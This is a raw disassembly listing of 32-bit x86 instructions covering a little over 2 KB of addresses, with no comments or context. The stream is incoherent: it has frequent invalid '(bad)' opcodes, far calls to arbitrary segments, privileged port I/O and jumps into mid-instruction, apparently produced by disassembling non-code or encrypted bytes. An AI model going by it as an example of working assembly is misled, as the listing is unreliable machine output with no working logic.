  448fa6:	lods   eax,DWORD PTR ds:[esi]
  448fa7:	mov    ecx,0xae1f10e7
  448fac:	inc    edx
  448fad:	push   ebp
  448fae:	call   0x8382:0x6f5930d
  448fb5:	xchg   esp,eax
  448fb6:	loopne 0x448f5f
  448fb8:	add    eax,0x6d7106
  448fbd:	les    ebx,FWORD PTR [eax-0x26]
  448fc0:	mov    dl,0xd1
  448fc2:	imul   ebp,DWORD PTR [edx+0x4a],0x35dbfa29
  448fc9:	or     eax,DWORD PTR [ecx+0x19426e8a]
  448fcf:	(bad)  
  448fd0:	mov    edx,esp
  448fd2:	call   0xa080:0x5fb650c1
  448fd9:	adc    ah,0xa7
  448fdc:	imul   ebp,DWORD PTR [ebx],0x3a
  448fdf:	cs iret 
  448fe1:	cs mov bh,0x43
  448fe4:	mov    ebx,0xffc8983f
  448fe9:	mov    esi,DWORD PTR [ecx-0x5f]
  448fec:	pop    es
  448fed:	mov    ecx,0xe4baa72e
  448ff2:	xor    BYTE PTR [ecx-0x536a0e61],dl
  448ff8:	scas   eax,DWORD PTR es:[edi]
  448ff9:	out    0xd2,al
  448ffb:	std    
  448ffc:	jb     0x448f87
  448ffe:	xchg   ebp,eax
  449000:	cmp    cl,BYTE PTR [eax]
  449002:	mov    esi,0xd153bca7
  449007:	rcr    DWORD PTR [ebp-0x23],cl
  44900a:	sub    BYTE PTR [edi+0x630784b3],cl
  449010:	xor    eax,0x6e307347
  449015:	imul   sp,WORD PTR [edi-0x67c62fc0],0x46
  44901d:	xor    eax,DWORD PTR [edi-0x6c]
  449020:	and    cl,BYTE PTR [ecx-0x46ff36a]
  449026:	jp     0x448fe5
  449028:	int3   
  449029:	inc    ebx
  44902a:	jecxz  0x448fe6
  44902c:	mov    dl,0xe7
  44902e:	fdivr  QWORD PTR [edi+0x3b2a32e2]
  449034:	mov    ch,0x5
  449036:	pop    esp
  449037:	out    0x39,al
  449039:	mov    esp,0x98d2d7ba
  44903e:	stos   DWORD PTR es:[edi],eax
  44903f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449040:	mov    ds:0xb1e2b2f0,al
  449045:	ins    BYTE PTR es:[edi],dx
  449046:	add    BYTE PTR [ebx-0xa65b5ae],bl
  44904c:	mov    ebx,0x542a95c
  449051:	jmp    0x44904e
  449053:	fiadd  DWORD PTR [eax]
  449055:	or     ebp,DWORD PTR [ebp+0x28]
  449058:	stos   DWORD PTR es:[edi],eax
  449059:	adc    eax,0xd1a6fb53
  44905e:	call   0x33ea:0x44fd387b
  449065:	dec    ebx
  449066:	int    0x5f
  449068:	mov    ds:0xcb522b0b,al
  44906d:	inc    eax
  44906e:	jnp    0x449025
  449070:	jg     0x4490c5
  449072:	je     0x449030
  449074:	mov    al,0xd4
  449076:	das    
  449077:	sti    
  449078:	lods   eax,DWORD PTR ds:[esi]
  449079:	mov    eax,0x35fae752
  44907e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449080:	xchg   DWORD PTR [eax],ecx
  449082:	push   esp
  449083:	dec    ebx
  449084:	mov    edi,0xb9cd1796
  449089:	fwait
  44908a:	jmp    0xcc97a71
  44908f:	xchg   DWORD PTR [ebp+0x4b],esp
  449092:	cmp    eax,0x5e0b3bb5
  449097:	outs   dx,BYTE PTR ds:[esi]
  449098:	loop   0x449032
  44909a:	dec    ecx
  44909b:	xchg   esp,eax
  44909c:	mov    eax,0x384087f9
  4490a1:	pop    edx
  4490a2:	fisub  DWORD PTR [ecx-0x3e]
  4490a5:	sbb    al,0xe3
  4490a7:	data16 ror BYTE PTR [ebx],1
  4490aa:	or     BYTE PTR [esi],0x8a
  4490ad:	xchg   edx,eax
  4490ae:	or     al,0xe8
  4490b0:	inc    ebp
  4490b1:	mov    esp,0x6b78b9a
  4490b6:	and    edx,esi
  4490b8:	pop    ebx
  4490b9:	in     al,0xab
  4490bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4490bc:	lods   al,BYTE PTR ds:[esi]
  4490bd:	jae    0x4490d3
  4490bf:	out    dx,al
  4490c0:	and    BYTE PTR [eax+0x6644b56a],cl
  4490c6:	fwait
  4490c7:	inc    edi
  4490c8:	xor    ch,bh
  4490ca:	mov    esp,fs
  4490cc:	cmp    ah,dh
  4490ce:	icebp  
  4490cf:	inc    edi
  4490d0:	mov    ebp,0xb24fefcc
  4490d5:	inc    edx
  4490d6:	test   eax,0x25f06229
  4490db:	adc    esp,DWORD PTR [edi+0xb]
  4490de:	stos   BYTE PTR es:[edi],al
  4490df:	ss mov edx,0x38e72f55
  4490e5:	and    al,0x9d
  4490e7:	cld    
  4490e8:	xchg   DWORD PTR [ecx],ebx
  4490ea:	(bad)  [edi]
  4490ec:	inc    edx
  4490ed:	jno    0x4490a7
  4490ef:	cmp    DWORD PTR [eax],esi
  4490f1:	xor    eax,0x4eb2a9b9
  4490f6:	bound  esi,QWORD PTR [edi+0x66]
  4490f9:	jb     0x4490aa
  4490fb:	rol    al,cl
  4490fd:	add    al,0x9a
  4490ff:	and    cl,BYTE PTR [ebx-0x7f]
  449102:	stos   BYTE PTR es:[edi],al
  449103:	jmp    0x4490d6
  449105:	addr16 loope 0x4490af
  449108:	cmp    DWORD PTR [esi+0x5471394d],ebx
  44910e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44910f:	jmp    DWORD PTR [eax-0x4ec24435]
  449115:	mov    esp,0x930ec752
  44911a:	(bad)  
  44911b:	sahf   
  44911c:	into   
  44911d:	or     edx,DWORD PTR [ecx-0xdbcdceb]
  449123:	sbb    ch,ah
  449125:	pop    ecx
  449126:	call   0xad11:0xe5a14079
  44912d:	adc    esp,DWORD PTR [eax+esi*4+0x57943473]
  449134:	pop    ebx
  449135:	ficomp WORD PTR [edx+0x10ce4589]
  44913b:	es leave 
  44913d:	(bad)  
  44913e:	je     0x4490e7
  449140:	mov    ah,0x47
  449142:	(bad)  
  449143:	fsub   DWORD PTR [edx]
  449145:	scas   al,BYTE PTR es:[edi]
  449146:	aam    0xae
  449148:	mov    dl,0xb6
  44914a:	repz (bad)
  44914d:	mov    ?,ecx
  44914f:	lods   al,BYTE PTR ds:[esi]
  449150:	lods   al,BYTE PTR ds:[esi]
  449151:	or     ecx,eax
  449153:	or     bh,BYTE PTR [ecx]
  449155:	push   es
  449156:	ins    DWORD PTR es:[edi],dx
  449157:	push   ebp
  449158:	dec    esi
  449159:	out    0x9a,al
  44915b:	repnz mov eax,0x249c4d4a
  449161:	mov    bl,ch
  449163:	ror    BYTE PTR [ebp-0x57b0a9f5],1
  449169:	jo     0x4491a4
  44916b:	stos   BYTE PTR es:[edi],al
  44916c:	mov    ebp,0xfd759a67
  449171:	fcom   QWORD PTR [ebx-0x33]
  449174:	mov    esi,0x3ca75ddd
  449179:	or     eax,0x9c885d07
  44917e:	scas   al,BYTE PTR es:[edi]
  44917f:	xchg   esi,eax
  449180:	mov    dl,0xfe
  449182:	sub    al,0xf2
  449184:	adc    ecx,DWORD PTR [edi-0x2d]
  449187:	cmp    DWORD PTR [ecx],edi
  449189:	or     ebx,DWORD PTR [ecx-0x4ef18547]
  44918f:	sti    
  449190:	aam    0x9c
  449192:	call   0xa3aa:0x9640781
  449199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44919a:	jnp    0x449173
  44919c:	mov    ch,0xb
  44919e:	shr    BYTE PTR [ebx-0x20],0x2b
  4491a2:	or     ecx,esp
  4491a4:	stos   BYTE PTR es:[edi],al
  4491a5:	adc    eax,0xec5b4c9a
  4491aa:	pop    ecx
  4491ab:	enter  0x2850,0x48
  4491af:	aaa    
  4491b0:	pop    edx
  4491b1:	or     ebp,esi
  4491b3:	aad    0xdc
  4491b5:	fld    TBYTE PTR [ebx-0x12]
  4491b8:	cmp    DWORD PTR [esi],esp
  4491ba:	call   0x5add:0xe30d64fb
  4491c1:	mov    ebp,0x8ba3a73a
  4491c6:	jbe    0x4491ac
  4491c8:	fisubr WORD PTR [ebp-0x473ff0ac]
  4491ce:	call   0x55d1:0x4b65a5dc
  4491d5:	mov    bl,0xbd
  4491d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4491d8:	mov    ds:0x4e31794,eax
  4491dd:	jbe    0x4491e0
  4491df:	loope  0x449193
  4491e1:	jp     0x449214
  4491e3:	mov    DWORD PTR [ebp-0x2d],esi
  4491e6:	dec    ebp
  4491e7:	imul   edi,DWORD PTR [esi],0xb
  4491ea:	test   al,0x72
  4491ec:	fmul   QWORD PTR [edx+0x6e]
  4491ef:	mov    al,ds:0x329820d1
  4491f4:	(bad)  [edx+ebp*8+0xe4baf56]
  4491fb:	or     al,0xaa
  4491fd:	or     edi,DWORD PTR [ecx-0x7e6bc338]
  449203:	sbb    DWORD PTR [eax],edi
  449205:	or     BYTE PTR [ecx-0x6508fcf3],ah
  44920b:	into   
  44920c:	cwde   
  44920d:	in     eax,0xc5
  44920f:	leave  
  449210:	ss icebp 
  449212:	arpl   ax,bx
  449214:	sub    al,0x16
  449216:	pop    esi
  449217:	add    bh,BYTE PTR [ebx+ecx*4]
  44921a:	sahf   
  44921b:	cmp    ebp,DWORD PTR [ebp-0x4df84da7]
  449221:	jne    0x449211
  449223:	test   BYTE PTR [ebx-0x71f2ec5d],bh
  449229:	add    al,0xe
  44922b:	mov    edx,0xc45a5ae9
  449230:	pop    esp
  449231:	mov    cl,0x48
  449233:	fidiv  WORD PTR [ecx+0x24ad5e83]
  449239:	jns    0x44920c
  44923b:	pop    ds
  44923c:	pop    edx
  44923d:	cmp    esp,DWORD PTR ss:[esi-0xc578af9]
  449244:	shl    BYTE PTR [ebx-0x7],1
  449247:	xchg   edi,eax
  449248:	jmp    0x367a:0x94e19bd9
  44924f:	gs xchg ebp,eax
  449251:	sar    BYTE PTR [esi+0x11],0x6d
  449255:	cmc    
  449256:	pop    esi
  449257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449258:	sub    DWORD PTR [ecx],0x805d7ac9
  44925e:	fisub  DWORD PTR [ebp-0x75]
  449261:	pop    ebp
  449262:	or     ah,dl
  449264:	scas   al,BYTE PTR es:[edi]
  449265:	or     al,0x66
  449267:	popa   
  449268:	xor    bl,BYTE PTR [edx+ebx*1+0x71]
  44926c:	or     cl,bh
  44926e:	adc    DWORD PTR [eax-0x714890ed],ebp
  449274:	jb     0x449203
  449276:	jecxz  0x44922a
  449278:	sub    eax,0x11b9a02
  44927d:	mov    bl,0xa9
  44927f:	sbb    BYTE PTR [ebp+0x35a7191f],bl
  449285:	daa    
  449286:	pop    eax
  449287:	and    dl,BYTE PTR [edi]
  449289:	lahf   
  44928a:	jb     0x4492f3
  44928c:	(bad)  
  44928d:	setp   BYTE PTR [esi-0x77]
  449291:	push   eax
  449292:	icebp  
  449293:	pop    esp
  449294:	sub    eax,0x748fd131
  449299:	sub    BYTE PTR ds:0xab1efea8,0x90
  4492a0:	repnz mov al,ds:0xb393bf43
  4492a6:	call   0x1369:0x7b5b47c3
  4492ad:	jp     0x4492d0
  4492af:	mov    al,ds:0x74870d3b
  4492b4:	sub    eax,0x464463cc
  4492b9:	call   0xa04967f0
  4492be:	call   0xfac7:0xa0377ad6
  4492c5:	std    
  4492c6:	xchg   DWORD PTR [esi-0x6e4469e0],esp
  4492cc:	or     BYTE PTR [eax+0x1d],cl
  4492cf:	ja     0x4492b9
  4492d1:	rcl    DWORD PTR [esi-0x3816b71e],1
  4492d7:	jmp    0x662e976d
  4492dc:	jne    0x4492b2
  4492de:	sbb    cl,BYTE PTR [edx+0x2c3c5434]
  4492e4:	add    ch,BYTE PTR [ebp+0x4637b19a]
  4492ea:	or     esi,esp
  4492ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4492ed:	xor    DWORD PTR [edi],ebp
  4492ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4492f0:	bound  edi,QWORD PTR [edi+0x1b141e4c]
  4492f6:	call   0x95d4e994
  4492fb:	mov    BYTE PTR [edx+0x6e],dl
  4492fe:	jle    0x449367
  449300:	add    al,0xa9
  449302:	bnd jns 0x44937c
  449305:	or     esp,DWORD PTR [edx]
  449307:	xchg   ebp,eax
  449308:	or     DWORD PTR [eax],ebx
  44930a:	sub    BYTE PTR [edx-0x5065bae3],ch
  449310:	add    eax,0xd94379c3
  449315:	dec    ebp
  449316:	or     eax,0xda4964a7
  44931b:	pop    edi
  44931c:	cmp    dh,BYTE PTR [edi-0x4a4db1fc]
  449322:	mov    al,ds:0x347b72fb
  449327:	jmp    0x4492ab
  449329:	or     esp,edx
  44932b:	daa    
  44932c:	aad    0xb2
  44932e:	sub    DWORD PTR [ebx-0x3a6586e1],esi
  449334:	cld    
  449335:	add    al,0xfb
  449337:	mov    ds:0x3f259394,eax
  44933c:	ror    DWORD PTR [ebx],0x41
  44933f:	test   edx,ecx
  449341:	xor    eax,0x8b079a8f
  449346:	sub    bh,cl
  449348:	mov    ch,0x9c
  44934a:	sub    esp,eax
  44934c:	sbb    al,0xbd
  44934e:	sub    ch,BYTE PTR [edx]
  449350:	mov    esp,0xbd374fd8
  449355:	or     al,0xc0
  449357:	sub    ebx,ebp
  449359:	sub    edx,edi
  44935b:	out    0x63,eax
  44935d:	cwde   
  44935e:	lahf   
  44935f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449360:	mov    dl,0xef
  449362:	mov    BYTE PTR [ecx-0x247e3fa9],dl
  449368:	sbb    ecx,DWORD PTR [ebx]
  44936a:	jnp    0x449303
  44936c:	ret    0xb675
  44936f:	out    0xd6,al
  449371:	loope  0x449308
  449373:	add    eax,0x47132654
  449378:	je     0x449349
  44937a:	sub    DWORD PTR [ebx-0x4dbcf458],edx
  449380:	mov    al,0x72
  449382:	sbb    ebx,DWORD PTR [ebp-0x4]
  449385:	lea    ebx,[edx-0xd86dd2c]
  44938b:	pop    esp
  44938c:	das    
  44938d:	call   0x8045:0x16a6dfd6
  449394:	in     eax,0xf6
  449396:	sbb    eax,0x78bf8277
  44939b:	ja     0x4493f6
  44939d:	xchg   esp,eax
  44939e:	xchg   esi,eax
  44939f:	pop    es
  4493a0:	mov    ebp,0xb3f9470d
  4493a5:	or     eax,DWORD PTR [edx]
  4493a7:	pop    ds
  4493a8:	test   BYTE PTR [edi-0x51da5844],0x4c
  4493af:	mov    ebp,0x680bff0e
  4493b4:	mov    dl,0xb0
  4493b6:	outs   dx,DWORD PTR ds:[esi]
  4493b7:	add    ebp,DWORD PTR [edx-0x3f7de57a]
  4493bd:	or     ah,BYTE PTR [edi]
  4493bf:	aas    
  4493c0:	or     al,0x61
  4493c2:	ins    BYTE PTR es:[edi],dx
  4493c3:	aaa    
  4493c4:	out    dx,al
  4493c5:	das    
  4493c6:	loope  0x449436
  4493c8:	mov    dl,0xc1
  4493ca:	sub    eax,ebx
  4493cc:	popa   
  4493cd:	fisttp WORD PTR [edx+0x3d]
  4493d0:	ja     0x4493dc
  4493d2:	push   0xffffffaa
  4493d4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4493d6:	jmp    0xe68089e4
  4493db:	call   0xe0378b93
  4493e0:	gs ret 
  4493e2:	mov    ebx,DWORD PTR [edi-0x4ad1123e]
  4493e8:	dec    ecx
  4493e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4493ea:	lods   al,BYTE PTR ds:[esi]
  4493eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4493ec:	or     DWORD PTR [eax-0x69],esp
  4493ef:	test   DWORD PTR [edx],ebp
  4493f1:	into   
  4493f2:	test   BYTE PTR [ebp+ecx*8-0x71bea5f7],bl
  4493f9:	sbb    al,0xf9
  4493fb:	dec    esp
  4493fc:	daa    
  4493fd:	(bad)  
  4493fe:	out    dx,al
  4493ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449400:	cdq    
  449401:	popa   
  449402:	ss push ecx
  449404:	std    
  449405:	push   ecx
  449406:	test   eax,0xec5cb17a
  44940b:	pop    eax
  44940c:	in     eax,dx
  44940d:	repnz push esi
  44940f:	aas    
  449410:	mov    edi,0x32a03c14
  449415:	mov    al,ds:0xfb9ba2da
  44941a:	pop    esp
  44941b:	lea    esi,[esi-0x3e3f2d97]
  449421:	sbb    eax,0xcab2a423
  449426:	sti    
  449427:	daa    
  449428:	scas   eax,DWORD PTR es:[edi]
  449429:	jle    0x449420
  44942b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44942c:	in     eax,dx
  44942d:	jnp    0x449457
  44942f:	jge    0x449482
  449431:	repz lahf 
  449433:	std    
  449434:	mov    dl,0xa0
  449436:	out    dx,al
  449437:	mov    bl,0x67
  449439:	cwde   
  44943a:	mov    edi,0x4dab0f33
  44943f:	xor    eax,0xea9d09eb
  449444:	rol    DWORD PTR [edi],cl
  449446:	or     DWORD PTR ds:0xe9566bc7,0x63
  44944d:	loope  0x4493e8
  44944f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449450:	push   ebp
  449451:	ret    
  449452:	fcomi  st,st(2)
  449454:	lods   al,BYTE PTR ds:[esi]
  449455:	push   0xffffffa0
  449457:	pop    ebp
  449458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449459:	pop    edi
  44945a:	fwait
  44945b:	jns    0x44940e
  44945d:	xor    ch,0x9b
  449460:	push   ds
  449461:	fcmovnb st,st(4)
  449463:	stos   DWORD PTR es:[edi],eax
  449464:	mov    ecx,0xb2bd3132
  449469:	jne    0x449435
  44946b:	lea    esp,[eax+edx*4]
  44946e:	pop    eax
  44946f:	out    dx,eax
  449470:	mov    dl,0xb6
  449472:	sbb    dl,BYTE PTR [edi-0x12]
  449475:	in     al,dx
  449476:	int    0x76
  449478:	xchg   esp,eax
  449479:	jmp    0x44949d
  44947b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44947c:	mov    bh,0x96
  44947e:	mov    dh,0x6
  449480:	cmp    al,0x56
  449482:	cmc    
  449483:	adc    ebp,edi
  449485:	xchg   edi,eax
  449486:	sbb    al,BYTE PTR [esi-0x56]
  449489:	sbb    ebx,DWORD PTR [esi-0x124c259]
  44948f:	popf   
  449490:	fistp  QWORD PTR [esi+eiz*2+0x6263b23d]
  449497:	dec    esp
  449498:	jle    0x4494aa
  44949a:	and    al,BYTE PTR [ecx-0x78bd6b24]
  4494a0:	mov    dl,0x5e
  4494a2:	pop    ebp
  4494a3:	xchg   ebp,eax
  4494a4:	mov    edx,DWORD PTR [ebp-0x49]
  4494a7:	ret    
  4494a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4494a9:	or     edx,DWORD PTR [esi+0x7d]
  4494ac:	and    eax,DWORD PTR ds:0x6dd072e
  4494b2:	xchg   esp,eax
  4494b3:	push   esi
  4494b4:	sub    ebx,DWORD PTR [edi]
  4494b6:	ss addr16 (bad) 
  4494b9:	xchg   esp,eax
  4494ba:	xor    DWORD PTR fs:[ebp-0x732a0d3],0x14
  4494c2:	ret    
  4494c3:	addr16 jb 0x4494a2
  4494c6:	xchg   ebp,eax
  4494c7:	mov    ebp,0x779ab017
  4494cc:	dec    ebp
  4494cd:	fdivr  DWORD PTR [edx]
  4494cf:	repz push ecx
  4494d1:	push   ds
  4494d2:	mov    cl,0x4f
  4494d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4494d5:	call   FWORD PTR [ebx-0x27f5ece1]
  4494db:	dec    ecx
  4494dc:	test   DWORD PTR [edi],edi
  4494de:	push   esp
  4494df:	and    BYTE PTR [ebx],al
  4494e1:	out    0xc9,eax
  4494e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4494e4:	mov    dl,0x18
  4494e6:	inc    eax
  4494e7:	pop    eax
  4494e8:	mov    dh,BYTE PTR [edi+0x151f8595]
  4494ee:	imul   ebp,esp,0x1cfb4baf
  4494f4:	arpl   WORD PTR [ecx-0x494d14a0],sp
  4494fa:	int    0x2
  4494fc:	cwde   
  4494fd:	mov    ebx,0xb2e2832
  449502:	aaa    
  449503:	imul   edx,DWORD PTR [ecx+edi*2+0x41],0xfffffff3
  449508:	xor    BYTE PTR [ebx],0x9a
  44950b:	repnz xor BYTE PTR [edx-0x11],bl
  44950f:	mov    bh,0x16
  449511:	stos   DWORD PTR es:[edi],eax
  449512:	aad    0xba
  449514:	xlat   BYTE PTR ds:[ebx]
  449515:	and    DWORD PTR [edi+eiz*2+0x44db5946],ebx
  44951c:	dec    ebp
  44951d:	adc    bl,BYTE PTR [edx-0x39034b3]
  449523:	cs jg  0x44956a
  449526:	mov    eax,ds:0x828cefa7
  44952b:	adc    dh,BYTE PTR [eax+0x69]
  44952e:	xlat   BYTE PTR ds:[ebx]
  44952f:	daa    
  449530:	mov    ch,0x50
  449532:	adc    eax,0xda9e1e54
  449537:	shr    al,cl
  449539:	ja     0x4494f0
  44953b:	dec    edi
  44953c:	xor    ecx,DWORD PTR [ebx]
  44953e:	xchg   ecx,eax
  44953f:	mov    bh,0xb7
  449541:	jl     0x449593
  449543:	repz push ss
  449545:	push   edx
  449546:	push   0x1a39b242
  44954b:	xchg   edi,eax
  44954c:	adc    dl,BYTE PTR [edi+0xbb42801]
  449552:	dec    ebp
  449553:	gs call 0x7e55:0x23ebd45e
  44955b:	or     al,0xb2
  44955d:	jno    0x4494f4
  44955f:	test   BYTE PTR [eax+esi*8+0xba721f6],dl
  449566:	mov    eax,ds:0xf8036e60
  44956b:	mov    ds:0x119878af,al
  449570:	js     0x449574
  449572:	in     eax,dx
  449573:	jmp    0x4494fa
  449575:	jmp    0x44952b
  449577:	mov    esi,0x49353299
  44957c:	xor    ch,BYTE PTR [esi+ebx*1-0x90d5954]
  449583:	stos   DWORD PTR es:[edi],eax
  449584:	mov    gs,WORD PTR [esi+0x79]
  449587:	and    BYTE PTR [edx-0x4a],dh
  44958a:	mov    dh,0x85
  44958c:	push   ss
  44958d:	jge    0x4495e9
  44958f:	pop    edi
  449590:	mov    al,ds:0xa8d0211c
  449595:	or     ebp,DWORD PTR [ebp+0x7c]
  449598:	mov    cl,bl
  44959a:	mov    DWORD PTR [edx-0xc437631],0x3b998f20
  4495a4:	add    eax,0x335f5113
  4495a9:	mov    dh,0x2f
  4495ab:	mov    al,ds:0xa0729d85
  4495b0:	adc    DWORD PTR [ebx-0x469d74c6],ecx
  4495b6:	fwait
  4495b7:	mov    ch,0xb8
  4495b9:	mov    eax,0x5048593b
  4495be:	dec    esi
  4495bf:	mov    esi,0xbbbae50f
  4495c4:	inc    esi
  4495c5:	jmp    0x1687:0x69cce7e3
  4495cc:	pop    ecx
  4495cd:	xchg   edi,eax
  4495ce:	fwait
  4495cf:	mov    eax,ds:0xe324fa60
  4495d4:	fwait
  4495d5:	inc    esi
  4495d6:	inc    edx
  4495d7:	ins    BYTE PTR es:[edi],dx
  4495d8:	ror    DWORD PTR [ebx],0xb1
  4495db:	hlt    
  4495dc:	add    ah,cl
  4495de:	sub    ebx,edi
  4495e0:	pop    edi
  4495e1:	pop    es
  4495e2:	call   0xa0ac:0xdd62c761
  4495e9:	sti    
  4495ea:	adc    ah,BYTE PTR [eax-0x702d851a]
  4495f0:	pop    es
  4495f1:	sub    edx,esp
  4495f3:	mov    ebp,0xb9a4941
  4495f8:	xor    BYTE PTR [ecx-0x28387d70],0xc4
  4495ff:	fwait
  449600:	int3   
  449601:	rcr    DWORD PTR [edx],cl
  449603:	loopne 0x4495e2
  449605:	cdq    
  449606:	jae    0x449629
  449608:	jmp    0x7ed3d3d
  44960d:	or     BYTE PTR [ebx-0x3],ah
  449610:	pop    ds
  449611:	or     DWORD PTR [edi+eax*2-0x58809d42],eax
  449618:	sbb    ecx,DWORD PTR [edx-0x29008e5e]
  44961e:	ret    0xb239
  449621:	pusha  
  449622:	neg    BYTE PTR [edx]
  449624:	add    dl,al
  449626:	pusha  
  449627:	imul   edx,edx,0xb
  44962a:	lods   eax,DWORD PTR ds:[esi]
  44962b:	mov    dh,0x93
  44962d:	push   es
  44962e:	jno    0x449649
  449630:	call   edi
  449632:	call   0x723b:0xa4230011
  449639:	dec    eax
  44963a:	inc    esp
  44963b:	test   eax,0xd5fcdc4e
  449640:	shr    BYTE PTR [ebx],cl
  449642:	pop    ds
  449643:	fimul  WORD PTR [ebx-0x532c6521]
  449649:	fcmovnb st,st(7)
  44964b:	dec    ecx
  44964c:	xchg   DWORD PTR fs:[eax+eiz*4+0x4a],edi
  449651:	lds    esp,FWORD PTR [edx+0x6f4b3553]
  449657:	dec    ebp
  449658:	stc    
  449659:	pop    eax
  44965a:	call   0xa677:0xe6dfa561
  449661:	push   ebx
  449662:	push   ebx
  449663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449664:	in     eax,0x2b
  449666:	mov    BYTE PTR [edx+eax*8-0x4dfc788c],bh
  44966d:	mov    ebp,0x6f6a3d04
  449672:	in     eax,dx
  449673:	mov    esi,0xc45b0b0e
  449678:	in     eax,0xd9
  44967a:	or     BYTE PTR [esi],ah
  44967c:	outs   dx,DWORD PTR ds:[esi]
  44967d:	mov    cl,0x74
  44967f:	mov    cl,0xaf
  449681:	mov    dh,0x18
  449683:	fdiv   QWORD PTR [edx]
  449685:	xor    ch,dl
  449687:	adc    al,0x9e
  449689:	loop   0x449658
  44968b:	mov    ds:0xc3bfc55c,al
  449690:	xchg   ebx,eax
  449691:	retf   0x106
  449694:	mov    bh,0xdb
  449696:	stos   DWORD PTR es:[edi],eax
  449697:	test   BYTE PTR [esi+0x7ec4e8e8],dh
  44969d:	mov    cl,0x5b
  44969f:	(bad)  
  4496a0:	cs push ds
  4496a2:	pop    esi
  4496a3:	out    dx,al
  4496a4:	popa   
  4496a5:	aaa    
  4496a6:	aam    0x41
  4496a8:	scas   al,BYTE PTR es:[edi]
  4496a9:	jno    0x449651
  4496ab:	daa    
  4496ac:	mov    BYTE PTR [ebp+0x5c],ah
  4496af:	sbb    al,0xf4
  4496b1:	adc    al,0x9a
  4496b3:	imul   ecx,edx,0x9c0f31b1
  4496b9:	out    0x4b,eax
  4496bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4496bc:	sub    BYTE PTR [eax+0x2f],bl
  4496bf:	(bad)
  4496c2:	dec    edx
  4496c3:	xchg   ebp,eax
  4496c4:	mov    dl,0x7
  4496c6:	sub    edx,DWORD PTR [edi]
  4496c8:	inc    eax
  4496c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4496ca:	nop
  4496cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4496cc:	or     cl,BYTE PTR [ebx]
  4496ce:	jecxz  0x4496e1
  4496d0:	xor    BYTE PTR [ebx],bh
  4496d2:	pop    edx
  4496d3:	daa    
  4496d4:	push   edi
  4496d5:	add    al,0x9d
  4496d7:	cld    
  4496d8:	in     al,0x23
  4496da:	and    DWORD PTR [esi-0x761ef20e],edi
  4496e0:	sub    al,0xb
  4496e2:	cli    
  4496e3:	data16 mov dh,0x20
  4496e6:	retf   
  4496e7:	jl     0x449678
  4496e9:	or     al,0x9a
  4496eb:	lods   al,BYTE PTR ds:[esi]
  4496ec:	inc    edi
  4496ed:	mov    cl,0x5
  4496ef:	pop    es
  4496f0:	inc    eax
  4496f1:	xlat   BYTE PTR ds:[ebx]
  4496f2:	shl    DWORD PTR [esi-0xe119928],cl
  4496f8:	push   0x944339a1
  4496fd:	popf   
  4496fe:	xchg   esp,eax
  4496ff:	jbe    0x449696
  449701:	xchg   DWORD PTR [edx],ecx
  449703:	add    al,0xd0
  449705:	mov    ch,0x36
  449707:	inc    edi
  449708:	pop    ebx
  449709:	aam    0xe7
  44970b:	test   al,0x2d
  44970d:	les    edx,FWORD PTR [eax]
  44970f:	mov    edx,0x28a7e031
  449714:	add    dh,ch
  449716:	(bad)  
  449717:	enter  0x3eb3,0x18
  44971b:	xchg   esi,ebx
  44971d:	dec    esi
  44971e:	call   0x8069161a
  449723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449724:	sti    
  449725:	out    dx,eax
  449726:	pop    edi
  449727:	(bad)  
  449729:	or     BYTE PTR [eax-0x41],cl
  44972c:	lods   al,BYTE PTR ds:[esi]
  44972d:	cld    
  44972e:	daa    
  44972f:	retf   0x6830
  449732:	jmp    0x2fc:0x6b8c8c6b
  449739:	mov    bh,BYTE PTR ds:0x360a759f
  44973f:	inc    esi
  449740:	mov    ecx,0x3e5f0143
  449745:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449747:	shl    DWORD PTR [ecx-0x6a615145],1
  44974d:	jmp    0x449745
  44974f:	pop    edi
  449750:	or     eax,0x54a77150
  449755:	dec    ebp
  449756:	repnz out 0x39,eax
  449759:	fistp  WORD PTR [ecx+0x64bd48d0]
  44975f:	mov    dl,0xb2
  449761:	push   edx
  449762:	into   
  449763:	in     eax,dx
  449764:	leave  
  449765:	pop    edx
  449766:	int3   
  449767:	mov    al,ds:0x5c080b2d
  44976c:	pop    si
  44976e:	in     eax,0xa1
  449770:	fcom   QWORD PTR [ecx-0x65]
  449773:	call   0xeb6a2626
  449778:	aam    0x78
  44977a:	cli    
  44977b:	out    0x9,eax
  44977d:	or     edx,DWORD PTR [eax+0x6]
  449780:	pushf  
  449781:	ins    BYTE PTR es:[edi],dx
  449782:	fwait
  449783:	mov    eax,0x3d9a1cd9
  449788:	sbb    eax,0xa25c599a
  44978d:	outs   dx,BYTE PTR ds:[esi]
  44978e:	jmp    0x4d0e:0x5b42dba7
  449795:	add    cl,BYTE PTR [ebx-0x10]
  449798:	mov    ch,0x7f
  44979a:	iret   
  44979b:	icebp  
  44979c:	aaa    
